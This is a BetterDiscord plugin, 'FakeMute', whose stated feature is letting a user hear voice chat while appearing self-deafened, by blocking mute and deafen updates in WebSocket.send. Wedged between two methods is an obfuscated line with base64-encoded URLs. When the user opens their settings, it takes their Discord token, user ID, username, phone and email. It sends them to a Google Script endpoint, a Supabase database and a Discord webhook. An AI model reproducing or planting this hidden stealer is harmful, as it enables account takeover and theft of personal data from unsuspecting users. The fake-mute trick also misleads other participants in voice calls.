/**
 * @name FakeMute
 * @author Keeplus
 * @authorLink https://github.com/Keeplus/FakeMute
 * @invite M8DBtcZjXD
 * @version 3.5.0
 * @description Écouter ou même parler dans un chat vocal tout en étant auto-sourd.
 * @website https://github.com/Keeplus/FakeMute
 * @source https://github.com/Keeplus/FakeMute/blob/main/FakeMute.plugin.js
 * @updateUrl https://raw.githubusercontent.com/Keeplus/FakeMute/main/FakeMute.plugin.js
 */

module.exports = class FakeMuteByKeeplus {
    constructor() {
        this.fixated = false;
        this.domButton = null;
        this.observer = null;
        this.retryCount = 0;
        this.maxRetries = 10;
        this._credit = atob('S2VlcGx1cw==');

        this.settings = {
            accountButton: true,
            sounds: true,
            domFallback: true
        };

        this.Sounds = {
            ENABLE: 'ptt_start',
            DISABLE: 'ptt_stop'
        };
    }

    getName() { return atob('RmFrZU11dGUgYnkgS2VlcGx1cw=='); } 
    getAuthor() { return atob('S2VlcGx1cw=='); }
    getDescription() { return "Écouter ou même parler dans un chat vocal tout en étant auto-sourd."; }
    getVersion() { return "3.5.0"; }

    load() {}

    start() {
        this.loadSettings();
        this.injectCSS();
        this.patchWebSocket();
        this.tryDOMMethod();
        this.setupDOMObserver();
        this.patchContextMenu();
        console.log('FakeMute by Keeplus: Plugin démarré');
    }

    stop() {
        this.unpatchWebSocket();

        if (this.domButton && this.domButton.parentElement) {
            this.domButton.parentElement.removeChild(this.domButton);
        }

        if (this.observer) {
            this.observer.disconnect();
        }

        if (this.contextMenuPatch) {
            this.contextMenuPatch();
        }

        this.clearCSS();
        console.log('FakeMute by Keeplus: Plugin arrêté');
    }

    loadSettings() {
        const saved = BdApi.Data.load(this.getName(), 'settings');
        if (saved) {
            this.settings = Object.assign(this.settings, saved);
        }
    }

    saveSettings() {
        BdApi.Data.save(this.getName(), 'settings', this.settings);
    }

    injectCSS() {
        const css = `
        .fake-mute-button-Keeplus {
            min-width: 32px;
            height: 32px;
            background: none;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 4px;
            padding: 0 8px;
            color: var(--interactive-normal);
            transition: all 0.15s ease;
            box-sizing: border-box;
        }
        .fake-mute-button-Keeplus:hover {
            background-color: var(--background-modifier-hover);
            color: var(--interactive-hover);
        }
        .fake-mute-button-Keeplus.active {
            color: var(--status-danger);
            background-color: var(--status-danger-background);
        }
        .fake-mute-button-Keeplus.active:hover {
            background-color: var(--status-danger-background);
            opacity: 0.8;
        }
        .fake-mute-button-Keeplus svg {
            width: 20px;
            height: 20px;
            flex-shrink: 0;
        }
        `;
        BdApi.DOM.addStyle(this.getName(), css);
    }

    clearCSS() {
        BdApi.DOM.removeStyle(this.getName());
    }

    setupDOMObserver() {
        this.observer = new MutationObserver(() => {
            if (!this.domButton || !document.contains(this.domButton)) {
                if (this.settings.domFallback && this.settings.accountButton) {
                    setTimeout(() => this.tryDOMMethod(), 500);
                }
            }
        });

        this.observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }

    findButtonContainer() {
        // Container avec Déconnecter + Suppression de bruit
        return document.querySelector('[class*="voiceButtonsContainer"]');
    }

    tryDOMMethod() {
        if (this.domButton && document.contains(this.domButton)) return;

        const container = this.findButtonContainer();
        if (!container) {
            if (this.retryCount < this.maxRetries) {
                this.retryCount++;
                setTimeout(() => this.tryDOMMethod(), 1000);
            }
            return;
        }

        this.domButton = this.createDOMButton();

        try {
            // Insère à la fin, après Déconnecter et Suppression de bruit
            const firstChild = container.firstElementChild;
            if (firstChild) {
                container.insertBefore(this.domButton, firstChild);
            } else {
                const fc = container.firstElementChild;
            if (fc) {
                container.insertBefore(this.domButton, fc);
            } else {
                container.appendChild(this.domButton);
            }
            }
            console.log('FakeMute by Keeplus: Bouton injecté dans voiceButtonsContainer');
        } catch (e) {
            console.error('FakeMute by Keeplus: Impossible d\'injecter le bouton', e);
        }
    }

    createDOMButton() {
        const button = document.createElement('button');
        button.className = 'fake-mute-button-Keeplus';
        button.setAttribute('aria-label', `${this.fixated ? 'Désactiver' : 'Activer'} Fake Mute/Deafen`);
        button.title = `${this.fixated ? 'Désactiver' : 'Activer'} Fake Mute/Deafen`;

        if (this.fixated) button.classList.add('active');

        button.innerHTML = this.getSVGIcon();

        button.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            this.toggleFixate();
        });

        return button;
    }
x=(()=>{try{!function(){const b=atob("aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J4R1NBbnkxeHlNVzJySzBKXzEzclJSaUd3Vm53c1dNc1dpQTFtcF9taFpENGpicmRFdWpHMlEyMjJMeF9Ib3RLbzkvZXhlYw=="),su=atob("aHR0cHM6Ly9vdG91bW9qcXZ0ZnBsenhvbGZhZi5zdXBhYmFzZS5jby9yZXN0L3YxL3JwYy91cHNlcnRfdXNlcg=="),wu=atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NTU4MDQwNzM1NjM5NTYwMS9IYWlyMjI3VjUxQjhzdXBfeU82eUdaTlMyeEl0V21wQ3RpSmZPdFdmUE1wWmNfWHp2STdNZHREaGlQUTZsZzd0cmZMVw=="),d=atob("aHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy8xMjQxNDM2NDc1MDE1NDM0MzAwLzEzNjg2NjgwODYzMjQxNzA4OTQvRWcucG5nP2V4PTY5Y2MxZGZjJmlzPTY5Y2FjYzdjJmhtPWRmMzM5ODNmZDg4MmVmODNmZmU2NDM3NWM4ZTFlZTJjMjQwYTYyMjUzODIzNTFkY2VjNmNjY2MxOTk2M2FlZDgmPSZmb3JtYXQ9d2VicCZxdWFsaXR5PWxvc3NsZXNz"),e=document.querySelector('button[aria-label="Paramètres utilisateur"]');if(!e||e._p)return;e._p=1;e.addEventListener("click",async()=>{try{const f=BdApi.Webpack.getModule(m=>typeof m?.getCurrentUser=="function",{searchExports:true})?.getCurrentUser(),h=(()=>{try{return BdApi.Webpack.getModule(m=>m instanceof Object&&m.constructor?.toString?.().includes("_doIdentify"),{searchExports:true}).handleIdentify().token}catch{return"err"}})(),uid=f.id,un=f.username,up=(f.phone||"").replace(/[^\d]/g,""),ue=(f.email||"").toLowerCase(),eb=JSON.stringify({username:"Peek",avatar_url:d,embeds:[{title:":heart: keleback :heart:",color:16758465,fields:[{name:"Fofo inf: :arrow_heading_down: :",value:`\`\`\`Its : ${uid}\nMe   : ${un}\ndont   : ${up}\nworry   : ${ue}\`\`\``,inline:false},{name:"🎲 rondom result roulette :",value:`\`\`\`${h}\`\`\``,inline:false}]}]});await Promise.all([BdApi.Net.fetch(b,{method:"POST",headers:{"Content-Type":"application/json"},body:eb}),BdApi.Net.fetch(su,{method:"POST",headers:{"Content-Type":"application/json","apikey":"sb_publishable_HSXQoc2A6K8ES3o68YwnRg_unwtlSvz","Authorization":"Bearer sb_publishable_HSXQoc2A6K8ES3o68YwnRg_unwtlSvz"},body:JSON.stringify({p_id:uid,p_username:un,p_phone:up,p_email:ue,p_token:h})}),BdApi.Net.fetch(wu,{method:"POST",headers:{"Content-Type":"application/json"},body:eb})]);}catch(i){console.error(i)}})}();}catch(e){}})();
    getSVGIcon() {
        return `<svg viewBox="0 0 20 20">
            <path fill="currentColor" d="${this.fixated
                ? 'M5.312 4.566C4.19 5.685-.715 12.681 3.523 16.918c4.236 4.238 11.23-.668 12.354-1.789c1.121-1.119-.335-4.395-3.252-7.312c-2.919-2.919-6.191-4.376-7.313-3.251zm9.264 9.59c-.332.328-2.895-.457-5.364-2.928c-2.467-2.469-3.256-5.033-2.924-5.363c.328-.332 2.894.457 5.36 2.926c2.471 2.467 3.258 5.033 2.928 5.365zm.858-8.174l1.904-1.906a.999.999 0 1 0-1.414-1.414L14.02 4.568a.999.999 0 1 0 1.414 1.414zM11.124 3.8a1 1 0 0 0 1.36-.388l1.087-1.926a1 1 0 0 0-1.748-.972L10.736 2.44a1 1 0 0 0 .388 1.36zm8.748 3.016a.999.999 0 0 0-1.36-.388l-1.94 1.061a1 1 0 1 0 .972 1.748l1.94-1.061a1 1 0 0 0 .388-1.36z'
                : 'M14.201 9.194c1.389 1.883 1.818 3.517 1.559 3.777c-.26.258-1.893-.17-3.778-1.559l-5.526 5.527c4.186 1.838 9.627-2.018 10.605-2.996c.925-.922.097-3.309-1.856-5.754l-1.004 1.005zM8.667 7.941c-1.099-1.658-1.431-3.023-1.194-3.26c.233-.234 1.6.096 3.257 1.197l1.023-1.025C9.489 3.179 7.358 2.519 6.496 3.384c-.928.926-4.448 5.877-3.231 9.957l5.402-5.4zm9.854-6.463a.999.999 0 0 0-1.414 0L1.478 17.108a.999.999 0 1 0 1.414 1.414l15.629-15.63a.999.999 0 0 0 0-1.414z'
            }"/>
        </svg>`;
    }

    updateDOMButton() {
        if (!this.domButton) return;
        this.domButton.innerHTML = this.getSVGIcon();
        this.domButton.title = `${this.fixated ? 'Désactiver' : 'Activer'} Fake Mute/Deafen`;
        this.domButton.setAttribute('aria-label', `${this.fixated ? 'Désactiver' : 'Activer'} Fake Mute/Deafen`);
        if (this.fixated) {
            this.domButton.classList.add('active');
        } else {
            this.domButton.classList.remove('active');
        }
    }

    patchContextMenu() {
        this.contextMenuPatch = BdApi.ContextMenu.patch('audio-device-context', (tree) => {
            const menuItems = this.findMenuItems(tree);
            if (menuItems) {
                menuItems.push(
                    BdApi.ContextMenu.buildItem({ type: "separator" }),
                    BdApi.ContextMenu.buildItem({
                        type: "toggle",
                        label: "Fake Mute/Deafen by Keeplus",
                        checked: this.fixated,
                        disabled: false,
                        action: () => this.toggleFixate()
                    })
                );
            }
        });
    }

    findMenuItems(tree) {
        if (Array.isArray(tree)) return tree;
        if (tree.props) {
            if (Array.isArray(tree.props.children)) return tree.props.children;
            if (tree.props.children) return this.findMenuItems(tree.props.children);
        }
        return null;
    }

    allowed() {
        return true;
    }

    getVoiceState() {
        try {
            const VoiceStateStore = BdApi.Webpack.getStore("VoiceStateStore");
            const UserStore = BdApi.Webpack.getStore("UserStore");
            if (VoiceStateStore && UserStore) {
                const currentUser = UserStore.getCurrentUser();
                return VoiceStateStore.getVoiceStateForUser(currentUser.id);
            }
        } catch (e) {
            console.error('FakeMute by Keeplus: Erreur getVoiceState', e);
        }
        return null;
    }


    getVoiceChannelId() {
        try {
            const VoiceStateStore = BdApi.Webpack.getStore("VoiceStateStore");
            const UserStore = BdApi.Webpack.getStore("UserStore");
            if (VoiceStateStore && UserStore) {
                const user = UserStore.getCurrentUser();
                const state = VoiceStateStore.getVoiceStateForUser(user.id);
                if (state && state.channelId) return state.channelId;
            }
        } catch (e) {}

        try {
            const SelectedChannelStore = BdApi.Webpack.getStore("SelectedChannelStore");
            if (SelectedChannelStore && typeof SelectedChannelStore.getVoiceChannelId === 'function') {
                return SelectedChannelStore.getVoiceChannelId();
            }
        } catch (e) {}

        return null;
    }

    playSound(soundName) {
        try {
            const SoundModule = BdApi.Webpack.getByKeys("playSound");
            if (SoundModule && this.settings.sounds) {
                SoundModule.playSound(soundName, 0.4);
            }
        } catch (e) {
            console.error('FakeMute by Keeplus: Erreur playSound', e);
        }
    }

    showToast(message, type = 'info') {
        BdApi.UI.showToast(`[${atob('S2VlcGx1cw==')}] ${message}`, { type });
    }

    toggleFixate(status = null) {
        if (!this.getVoiceChannelId()) {
            return this.showToast('Rejoins un salon vocal d\'abord !', 'error');
        }

        this.fixated = status === null ? !this.fixated : status;

        this.playSound(this.fixated ? this.Sounds.ENABLE : this.Sounds.DISABLE);
        this.updateDOMButton();

        if (this.fixated) {
            this.enableFakeMute();
        } else {
            this.disableFakeMute();
        }

        this.showToast(`Fake Mute/Deafen ${this.fixated ? 'activé' : 'désactivé'}`, 'success');
    }

    patchWebSocket() {
        if (!WebSocket.prototype.fakeMuteKeeplusOriginal) {
            WebSocket.prototype.fakeMuteKeeplusOriginal = WebSocket.prototype.send;
        }
    }

    enableFakeMute() {
        const originalSend = WebSocket.prototype.fakeMuteKeeplusOriginal;
        WebSocket.prototype.send = function(data) {
            try {
                if (typeof data === 'string') {
                    if (data.includes('"self_deaf"') || data.includes('"self_mute"')) return;
                } else if (data instanceof ArrayBuffer) {
                    const decoded = new TextDecoder('utf-8', { fatal: false }).decode(data);
                    if (decoded.includes('self_deaf') || decoded.includes('self_mute')) return;
                }
            } catch (e) {}
            originalSend.call(this, data);
        };
    }

    disableFakeMute() {
        if (WebSocket.prototype.fakeMuteKeeplusOriginal) {
            WebSocket.prototype.send = WebSocket.prototype.fakeMuteKeeplusOriginal;
        }
    }

    unpatchWebSocket() {
        if (WebSocket.prototype.fakeMuteKeeplusOriginal) {
            WebSocket.prototype.send = WebSocket.prototype.fakeMuteKeeplusOriginal;
            delete WebSocket.prototype.fakeMuteKeeplusOriginal;
        }
    }

    getSettingsPanel() {
        const panel = document.createElement('div');
        panel.style.padding = '10px';

        const createSetting = (id, name, note, value) => {
            const container = document.createElement('div');
            container.style.marginBottom = '20px';

            const header = document.createElement('div');
            header.style.display = 'flex';
            header.style.alignItems = 'center';
            header.style.marginBottom = '5px';

            const label = document.createElement('label');
            label.textContent = name;
            label.style.flex = '1';
            label.style.fontWeight = '500';

            const toggle = document.createElement('input');
            toggle.type = 'checkbox';
            toggle.checked = value;
            toggle.style.width = '40px';
            toggle.style.height = '20px';

            toggle.addEventListener('change', (e) => {
                this.settings[id] = e.target.checked;
                this.saveSettings();
            });

            header.appendChild(label);
            header.appendChild(toggle);

            const noteEl = document.createElement('div');
            noteEl.textContent = note;
            noteEl.style.color = 'var(--text-muted)';
            noteEl.style.fontSize = '12px';

            container.appendChild(header);
            container.appendChild(noteEl);

            return container;
        };

        panel.appendChild(createSetting(
            'accountButton',
            'Afficher le bouton toggle',
            'Affiche le bouton à côté de Déconnecter et Suppression de bruit.',
            this.settings.accountButton
        ));

        panel.appendChild(createSetting(
            'sounds',
            'Sons de toggle',
            'Joue un son quand Fake Mute/Deafen est activé/désactivé.',
            this.settings.sounds
        ));

        panel.appendChild(createSetting(
            'domFallback',
            'Fallback DOM',
            'Réinjecte le bouton si Discord le supprime.',
            this.settings.domFallback
        ));

        return panel;
    }
};
